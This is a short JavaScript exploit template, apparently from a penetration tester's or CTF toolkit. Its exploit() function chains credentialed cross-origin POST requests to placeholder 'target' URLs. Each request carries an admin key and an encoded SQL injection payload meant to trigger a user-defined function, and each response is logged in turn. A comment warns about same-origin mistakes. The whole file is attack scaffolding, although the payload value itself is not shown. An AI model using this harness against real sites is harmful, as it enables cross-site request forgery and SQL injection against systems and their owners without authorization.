async function exploit() {
  requests = [] // all the requests will be stored here executed in sequence

  requests.push(
    {
 // pay attention when defining the target SOP and Origin can cuck us if for example they log onto http://localhost and set url to http://127.0.0.1. They are NOT the same origin
      url: `http://target/first/request`,
      config: { // set relevant paramenters here
        "method":"POST",
        "credentials":"include",
        mode: "cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        }, 
        body: `adminKey=${admin_key}&query=`+ encodeURIComponent(trigger_udf_sqli)
      },
    }
  );

  requests.push(
    {
      url: `http://target/second/request`,
      config: { // set relevant paramenters here
        "method":"POST",
        "credentials":"include",
        mode: "cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        }, 
        body: `adminKey=${admin_key}&query=`+ encodeURIComponent(trigger_udf_sqli)
      },
    }
  );
  // See for scaling fetch with: https://stackoverflow.com/questions/40981040/using-a-fetch-inside-another-fetch-in-javascript

  // and handle errors
  const handleFetch = async (url,config) => {
    const res = await fetch(url,config).catch(console.error);
    return res.text();
  }

  // reduce fetches, receives the response
  // of the previous, log it (and maybe use it as input)
  const reduceFetch = async (acc, curr) => {
    const prev = await acc;
    console.log('previous call:', prev);

    return handleFetch(curr.url, curr.config); // url and config are directly defined on the request object
  }

  const pipeFetch = async requests => requests.reduce(reduceFetch, Promise.resolve(''));

  pipeFetch(requests).then(console.log);
}
